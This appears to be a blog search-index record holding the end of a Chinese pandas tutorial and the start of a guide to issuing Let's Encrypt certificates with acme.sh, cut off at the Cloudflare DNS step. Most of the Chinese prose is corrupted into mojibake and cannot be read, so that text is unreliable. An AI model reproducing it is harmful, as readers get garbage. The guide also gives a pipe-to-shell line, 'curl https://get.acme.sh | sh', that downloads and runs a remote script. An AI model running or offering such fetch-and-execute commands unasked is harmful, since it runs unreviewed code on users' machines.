CSVå†™å…¥ csv æ–‡ä»¶ df.to_csv('foo.csv') # ä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹ ä» csv æ–‡ä»¶ä¸­å¯¼å…¥æ•°æ® pd.read_csv('foo.csv') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Unnamed: 0 A B C D 0 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 1 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 3 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 4 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 5 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 6 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 7 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 8 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 9 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 10 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 11 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 12 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 13 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 14 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 15 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 16 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 17 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 18 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 19 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 20 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 21 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 22 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 23 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 24 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 25 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 26 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 27 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 28 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 29 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... ... 970 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 971 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 972 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 973 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 974 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 975 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 976 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 977 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 978 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 979 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 980 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 981 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 982 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 983 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 984 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 985 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 986 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 987 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 988 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 989 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 990 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 991 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 992 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 993 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 994 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 995 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 996 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 997 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 998 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 999 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows Ã— 5 columns 0x0E-2 HDF5å†™å…¥ HDF5 å­˜å‚¨ df.to_hdf('foo.h5','df') ä» HDF5 å­˜å‚¨ä¸­è¯»å–æ•°æ® pd.read_hdf('foo.h5','df') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows Ã— 4 columns 0x0E-3 Excelçœ‹ç½‘ä¸Šè¯´ï¼Œç›¸å¯¹äº xlwtã€xlrd ä¹‹ç±»çš„åº“ï¼Œç”¨ pandas æ¥å¯¹ excel è¿›è¡Œæ•°æ®å¤„ç†å’Œåˆ†ææŒºä¸é”™çš„ï¼Œæ­£å¥½æœ€è¿‘ä¹Ÿæƒ³è¯•è¯•å‘¢ã€‚ å†™å…¥ Excel df.to_excel('foo.xlsx', sheet_name='Sheet1') ä» excel ä¸­è¯»å–æ•°æ® pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Unnamed: 0 A B C D 0 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 1 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 3 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 4 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 5 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 6 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 7 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 8 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 9 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 10 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 11 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 12 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 13 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 14 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 15 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 16 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 17 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 18 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 19 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 20 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 21 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 22 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 23 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 24 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 25 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 26 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 27 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 28 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 29 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... ... 970 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 971 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 972 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 973 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 974 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 975 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 976 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 977 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 978 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 979 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 980 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 981 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 982 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 983 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 984 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 985 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 986 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 987 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 988 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 989 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 990 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 991 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 992 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 993 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 994 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 995 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 996 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 997 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 998 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 999 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows Ã— 5 columns 0x0F é™·é˜± Gotchaså¦‚æœä½ åœ¨è¿è¡Œä¸­çœ‹åˆ°ä¾‹å¦‚ä¸‹é¢çš„å¼‚å¸¸ã€‚ if pd.Series([False, True, False]): print(\"I was true\") --------------------------------------------------------------------------- ValueError Traceback (most recent call last) &lt;ipython-input-304-5c782b38cd2f&gt; in &lt;module&gt; ----&gt; 1 if pd.Series([False, True, False]): 2 print(\"I was true\") D:\\Programs\\Anaconda\\lib\\site-packages\\pandas\\core\\generic.py in __nonzero__(self) 1476 raise ValueError(\"The truth value of a {0} is ambiguous. \" 1477 \"Use a.empty, a.bool(), a.item(), a.any() or a.all().\" -&gt; 1478 .format(self.__class__.__name__)) 1479 1480 __bool__ = __nonzero__ ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all(). å¯ä»¥å‚è€ƒ Comparisons è¿™é‡Œæ¥å¯»æ±‚è§£é‡Šå’Œä¸‹ä¸€æ­¥çš„æ–¹æ¡ˆã€‚ ä¹Ÿå¯ä»¥å‚è€ƒ Comparisonsã€‚ ï¼ˆä¸Šé¢éƒ½æ˜¯å®˜æ–¹çš„æ–‡æ¡£åœ°å€ï¼‰ ï¼ˆå®˜æ–¹æ–‡æ¡£åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼‰ 0x10 å°ç»“å…³äºé€‰å–ï¼š é€‰æ‹©æ•´è¡Œ/æ•´åˆ—ï¼Œæˆ–å¤šä¸ªæ•´è¡Œ/å¤šä¸ªæ•´åˆ—çš„æ•°æ®ï¼Œå¯ä»¥ç”¨df[]ã€df.loc[]ã€df.iloc[]è¿™ä¸‰ç§ç”¨æ³•ã€‚ åŒºåŸŸé€‰å–ï¼Œåˆ†ä¸ºæ ‡ç­¾ç´¢å¼•å’Œæ•´æ•°ç´¢å¼• æ ‡ç­¾ç´¢å¼•ï¼šdf.loc[] æ•´æ•°ç´¢å¼•ï¼šdf.iloc[] é€‰å–å•å…ƒæ ¼ï¼šdf.at[]ã€df.iat[]ã€df.loc[]ã€df.iloc[] éƒ½å¯ä»¥ï¼Œè¦æ³¨æ„å‚æ•°ã€‚df[]ä¸è¡Œï¼ å…³äºé€‰å–çš„è¿”å›å€¼ï¼š è¿”å›å€¼åŒ…æ‹¬å•è¡Œå¤šåˆ—æˆ–å¤šè¡Œå•åˆ—æ—¶ï¼Œè¿”å›å€¼ä¸º Series å¯¹è±¡ è¿”å›å€¼åŒ…æ‹¬å¤šè¡Œå¤šåˆ—æ—¶ï¼Œè¿”å›å€¼ä¸º DataFrame å¯¹è±¡ è¿”å›å€¼ä»…ä¸ºä¸€ä¸ªå•å…ƒæ ¼ï¼ˆå•è¡Œå•åˆ—ï¼‰æ—¶ï¼Œè¿”å›å€¼ä¸ºï¼ˆå¯èƒ½æ˜¯ numpy çš„ï¼‰åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ str, float64, int64 ç­‰ df[]å› ä¸ºä¸èƒ½ç²¾ç¡®åˆ°å•å…ƒæ ¼ï¼Œæ‰€ä»¥è¿”å›å€¼ä¸€å®š DataFrame æˆ– Series å¯¹è±¡ å½“ä½¿ç”¨ DataFrame çš„é»˜è®¤ç´¢å¼•ï¼ˆæ•´æ•°ç´¢å¼•ï¼‰æ—¶ï¼Œæ•´æ•°ç´¢å¼•å³ä¸ºæ ‡ç­¾ç´¢å¼•ã€‚ å…¶å® pandas è¿˜æœ‰å¾ˆå¤šæœ‰ç”¨çš„ API è¿™é‡Œé¢è¿˜æ²¡ä»‹ç»ï¼Œåé¢æœ‰ç©ºå†æ…¢æ…¢äº†è§£å‘¢ã€‚ åšé¡¹ç›®çš„æ—¶å€™çœ‹çœ‹åˆ«äººåšè¿‡çš„å®ä¾‹ï¼Œå†æ·±å…¥çœ‹çœ‹ç›¸å…³çš„ API å¥½äº†ã€‚ å¤§æ¦‚å°±è¿™äº›å†…å®¹äº†å§ã€‚ ï¼ˆæºœäº†æºœäº† 20200418 æ›´æ–°ï¼š Jupyter Notebook æ–‡æ¡£ (.ipynb) æ”¾åˆ° GitHub ä¸Šäº†ï¼Œè¯¦è§è¿™é‡Œï¼šhttps://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb ä¸‹è½½æ–‡æ¡£çš„è¯ æˆ³è¿™é‡Œï¼ˆCDNï¼Œæ¨èï¼‰ å‘¢ï¼æˆ–è€… ä¹Ÿå¯ä»¥æˆ³è¿™é‡Œï¼ˆGitHub rawï¼‰ï¼ 0xFF References &amp; Extensive Readingå®˜æ–¹çš„ 10 Minutes to pandas [pythonæ•°æ®åˆ†æä¹‹pandasæ•°æ®é€‰å–ï¼šdf] df.loc[] df.iloc[] df.ix[] df.at[] df.iat[] å­¦ä¹ pythonä¸­çš„pandasæœ‰æ²¡æœ‰å¥½çš„æ•™ç¨‹æ¨èï¼Ÿ ä»Excelåˆ°Pythonï¼šæœ€å¸¸ç”¨çš„36ä¸ªPandaså‡½æ•°ï¼ etc.","path":"2020/04/17/DataScience_10MinutesToPandas/"},{"title":"åŸºäºacme.shä»Let's encryptç”Ÿæˆå…è´¹ä¸”è‡ªåŠ¨æ›´æ–°çš„SSLè¯ä¹¦","text":"0x00 å‰è¨€3æœˆ26æ—¥ï¼Œä¸€å † GitHub Pages ä»¥åŠ jd.com ç­‰ç½‘ç«™çš„ SSL è¯ä¹¦è¢«ä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ ï¼ˆC=CN; ST=GD; L=SZ; O=COM; OU=NSP; CN=SERVER; emailAddress=346608453@qq.com ï¼‰åŠ«æŒäº†ï¼Œå¼€å¯äº† HSTS åˆ™ä¼šè¢«æµè§ˆå™¨æ‹¦ä¸‹æ¥ã€‚ä¸è¿‡å¥—äº† CF çš„ CDN åˆ™ä¸å—å½±å“ã€‚27æ—¥å‘ç° *.github.io å¥½äº†ï¼ŒGitHub ä¸»ç«™è¢«åŠ«æŒäº†â€¦â€¦ï¼ˆçœŸç‹ å•Š å…·ä½“å‚è€ƒè¿™å‡ ç¯‡ï¼š https://www.v2ex.com/t/656367https://www.v2ex.com/t/656394https://m.cnbeta.com/view/960295.htmä¸€äº›ç½‘ç«™httpsè¯ä¹¦å‡ºç°é—®é¢˜çš„æƒ…å†µåˆ†æ ï¼ˆæœ€åè¿™ç¯‡è¯´å¾ˆå¤šå¤§ç«™éƒ½å—å½±å“äº† HTTPS åŠ å¯†é€šä¿¡æŒºé‡è¦çš„ï¼Œä¹‹å‰ä¹Ÿå¬è¯´è¿‡ MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰ï¼Œä¸è¿‡è¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´è¯ä¹¦è¢«åŠ«æŒçš„â€¦â€¦ æ€ä¹ˆè¯´å¥½å‘¢ï¼Œåº”è¯¥å¯ä»¥è¯´ç½‘ç»œä¸Šä¸èƒ½ä¿è¯ç»å¯¹å®‰å…¨å§ï¼Œæˆ–è€…è¯´ç»å¯¹å®‰å…¨æ˜¯ä¸å­˜åœ¨çš„ã€‚ æƒ³èµ·æ¥ä¹‹å‰æ­å»ºçš„ä¸€ä¸ªæœåŠ¡è¿˜æ²¡ä¸Š HTTPSï¼Œç„¶è€Œæƒ³ä¸èµ·æ¥ä¹‹å‰æ˜¯æ€ä¹ˆé…ç½® SSL è¯ä¹¦çš„äº†ï¼Œç„¶ååˆå¾—å»æ‰¾èµ„æ–™çƒ¦æ­»äº†ï¼Œäºæ˜¯è¿™å›é¡ºä¾¿æ¥è®°å½•ä¸€ä¸‹å¥½äº†å•¦ã€‚ï¼ˆæ‘Šæ‰‹ é€šè¿‡ Letâ€™s encrypt å¯ä»¥è·å¾— 90 å¤©å…è´¹ä¸”å¯ç»­æœŸçš„ SSL è¯ä¹¦ï¼Œè€Œåˆ©ç”¨ acme.sh å¯ä»¥è‡ªåŠ¨ç”Ÿæˆå’Œæ›´æ–°ï¼Œå°±æ¥ä»‹ç»ä¸€ä¸‹é…ç½®çš„è¿‡ç¨‹å§ã€‚ å½“ç„¶ï¼Œä½ è¿˜å¯ä»¥å°è¯•ç”¨ Letâ€™s Encrypt çš„ certbot å·¥å…·æ¥ç­¾å‘è¯ä¹¦ï¼Œä¸è¿‡è¦è£…ä¸€å †åº“å§ï¼Œæˆ‘ä¹Ÿä¸è®°å¾—äº†â€¦â€¦ ä¸‹é¢çš„å†…å®¹æ¶‰åŠ acme.sh çš„å®‰è£…ï¼Œè¯ä¹¦çš„ç­¾å‘åŠè®¤è¯ï¼Œå¦‚ä½•å®‰è£…åˆ° nginxï¼Œä»¥åŠè‡ªåŠ¨æ›´æ–°è¯ä¹¦ã€æ›´æ–° acme.sh ç­‰ã€‚ 0x01 å®‰è£… acme.shcurl https://get.acme.sh | sh æˆ–è€… wget -O - https://get.acme.sh | sh æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ï¼Œå®ƒä¼šï¼š ä» GitHub ä¸Šä¸‹è½½ sh è„šæœ¬å¹¶æ‰§è¡Œ æŠŠæ–‡ä»¶è§£å‹åˆ°ç”¨æˆ·çš„ ~/.acme.shç›®å½•ä¸‹ ç»™å‘½ä»¤è¡Œè®¾ç½®ä¸€ä¸ªacme.shçš„ alias åˆ«å æœ€åæ³¨å†Œä¸€ä¸ª cron å®šæ—¶ä»»åŠ¡æ¥è‡ªåŠ¨æ›´æ–°è¯ä¹¦ã€‚ å®‰è£…å®Œæˆåè¦è‡ªè¡Œé‡å¯å‘½ä»¤è¡Œï¼Œæˆ–è€…é‡æ–°åŠ è½½ä¸€ä¸‹.bashrcæ–‡ä»¶ï¼ˆsource ~/.bashrcï¼‰ã€‚ ç„¶åçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ç”Ÿæ•ˆã€‚ $ acme.sh -h https://github.com/acmesh-official/acme.sh v2.8.6 Usage: acme.sh command ...[parameters].... Commands: --help, -h Show this help message. --version, -v Show version info. --install Install acme.sh to your system. --uninstall Uninstall acme.sh, and uninstall the cron job. --upgrade Upgrade acme.sh to the latest code from https://github.com/acmesh-official/acme.sh. --issue Issue a cert. --signcsr Issue a cert from an existing csr. --deploy Deploy the cert to your server. --install-cert Install the issued cert to apache/nginx or any other server. # ...... 0x02 ç­¾å‘ SSL è¯ä¹¦ç­¾å‘ SSL è¯ä¹¦éœ€è¦è¯æ˜è¿™ä¸ªåŸŸåæ˜¯å±äºä½ çš„ï¼Œå³åŸŸåæ‰€æœ‰æƒï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼éªŒè¯ï¼šhttp å’Œ dns éªŒè¯ã€‚ é€šè¿‡ acme.sh å¯ä»¥ç­¾å‘å•åŸŸåã€å¤šåŸŸåã€æ³›åŸŸåè¯ä¹¦ï¼Œè¿˜å¯ä»¥ç­¾å‘ ECC è¯ä¹¦ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œè¿™é‡Œä»¥å•åŸŸåè¯ä¹¦ä¸ºä¾‹ï¼Œåé¢å†æ‹“å±•ä¸€ä¸‹å¥½äº†ã€‚ ä¸‹é¢ä»»æ„ä¸€ç§æ–¹å¼åªè¦å®‰è£…æˆåŠŸäº†å°±è¡Œï¼ æ³¨æ„ï¼šè¿™ä¸€æ­¥åªæ˜¯ç”Ÿæˆäº†è¯ä¹¦ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œé…ç½®ï¼Œå› æ­¤è®¿é—®ç½‘ç«™å½“ç„¶ä¸Šä¸äº† httpsã€‚ 2.1 HTTP éªŒè¯è¿™ç§æ–¹å¼ acme.sh ä¼šè‡ªåŠ¨åœ¨ä½ çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¥éªŒè¯ä½ çš„åŸŸåæ‰€æœ‰æƒï¼ŒéªŒè¯ä¹‹åå°±ç­¾å‘è¯ä¹¦ï¼Œæœ€åä¼šè‡ªåŠ¨åˆ é™¤éªŒè¯æ–‡ä»¶ã€‚ å‰ææ˜¯è¦ç»‘å®šçš„åŸŸåå·²ç»ç»‘å®šåˆ°äº†æ‰€åœ¨æœåŠ¡å™¨ä¸Šï¼Œä¸”å¯ä»¥é€šè¿‡å…¬ç½‘è¿›è¡Œè®¿é—®ï¼ 2.1.1 Webroot modeå‡è®¾æœåŠ¡å™¨åœ¨è¿è¡Œç€çš„ï¼Œç½‘ç«™åŸŸåä¸º example.comï¼Œæ ¹ç›®å½•ä¸º /home/wwwroot/example.comã€‚é‚£ä¹ˆåªéœ€è¦æ‰§è¡Œä¸‹é¢è¿™æ¡è¯­å¥å°±è¡Œã€‚ acme.sh --issue -d example.com -w /home/wwwroot/example.com 2.1.2 Apache / Nginx modeå¦‚æœç”¨çš„æ˜¯ Apache æˆ–è€… Nginx æœåŠ¡å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å¯»æ‰¾é…ç½®æ–‡ä»¶æ¥è¿›è¡Œç­¾å‘ã€‚ acme.sh --issue -d example.com --apache # Apache acme.sh --issue -d example.com --nginx # Nginx å¦‚æœæ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶çš„è¯å¯ä»¥è‡ªè¡Œé…ç½®ã€‚ acme.sh --issue -d example.com --nginx /etc/nginx/nginx.conf # æŒ‡å®šnginxçš„conf acme.sh --issue -d example.com --nginx /etc/nginx/conf.d/example.com.conf # æŒ‡å®šç½‘ç«™çš„conf 2.1.3 Standalone modeè¿™ç§æ–¹å¼ä¸‹ï¼Œacme.sh ä¼šè‡ªå·±å»ºç«‹ä¸€ä¸ªæœåŠ¡å™¨æ¥å®Œæˆç­¾å‘ã€‚ä¸»è¦é€‚åˆçš„æ˜¯æ²¡æœ‰å»ºç«‹æœåŠ¡å™¨çš„æƒ…å†µï¼Œä¸è¿‡å…¶å®æœ‰æœåŠ¡å™¨çš„è¯åªè¦æš‚æ—¶å…³é—­ï¼Œä¸é€ æˆç«¯å£å†²çªå°±èƒ½ä½¿ç”¨ã€‚ http æ¨¡å¼ï¼Œ80ç«¯å£ï¼š acme.sh --issue -d example.com --standalone å¦‚æœç”¨äº†åä»£ä¹‹ç±»çš„ä¸æ˜¯ 80 ç«¯å£ï¼Œåˆ™å¯ä»¥æ‰‹åŠ¨æŒ‡å®šã€‚ acme.sh --issue -d example.com --standalone --httpport 88 å½“ç„¶å®ƒè¿˜æ”¯æŒ tls æ¨¡å¼ï¼Œä¸æ˜¯ 443 ç«¯å£çš„è¯ä¹Ÿå¯ä»¥è‡ªè¡ŒæŒ‡å®šã€‚ acme.sh --issue -d example.com --alpn acme.sh --issue -d example.com --alpn --tlsport 8443 # è‡ªè¡ŒæŒ‡å®štlsç«¯å£ 2.2 DNS éªŒè¯è¿™ç§æ–¹å¼ä¸‹ï¼Œä¸éœ€è¦ä»»ä½•æœåŠ¡å™¨ï¼Œä¸éœ€è¦ä»»ä½•å…¬ç½‘ ipï¼Œåªéœ€è¦ dns çš„è§£æè®°å½•å³å¯å®ŒæˆéªŒè¯ã€‚ æ¯”å¦‚è¯´æœåŠ¡å™¨ä¸èƒ½ç›´æ¥å…¬ç½‘è®¿é—®ï¼Œä»¥åŠæŸäº› VPS ç›´æ¥ç»‘å®šåŸŸåæ²¡å¤‡æ¡ˆçš„è¯æ˜¯ä¸Šä¸å»çš„ï¼Œå°±éœ€è¦é‡‡ç”¨è¿™ç§æ–¹æ¡ˆäº†ã€‚ï¼ˆæˆ‘çš„å°±æ˜¯äº† å½“ç„¶ï¼Œæ‰‹é‡Œæœ‰åŸŸååªæ˜¯æƒ³ç”Ÿæˆä¸€ä¸ªè¯ä¹¦è€Œå·²ä¹Ÿå¯ä»¥è¿™ä¹ˆç”¨ã€‚ 2.2.1 DNS API modeè¿™ç§æ–¹å¼è´¼å¼ºå¤§ï¼Œç›´æ¥å¯ä»¥åˆ©ç”¨åŸŸåæœåŠ¡å•†æä¾›çš„ API å°±å¯ä»¥è‡ªåŠ¨å¸®ä½ æ·»åŠ  TXT è®°å½•å®ŒæˆéªŒè¯å’Œè¯ä¹¦ç­¾å‘ã€‚è€Œä¸”60å¤©åè¿˜å¯ä»¥è‡ªåŠ¨å®Œæˆç»­æœŸã€‚ï¼ˆæˆ‘å°±æ˜¯ç”¨è¿™ç§æ–¹å¼å®ç°å“’~ æ¯”å¦‚è¯´ CloudFlare çš„ï¼Œåœ¨è¿™é‡Œè·å–ä½ çš„API Keyã€‚å¯ä»¥ç”¨å…¨å±€ API Keyï¼Œå°†å‚æ•°å¯¼å…¥åˆ°å‘½ä»¤è¡Œã€‚ export CF_Token=\"sdfsdfsdfljlbjkljlkjsdfoiwje\" export CF_Account_ID=\"xxxxxxxxxxxxx\" 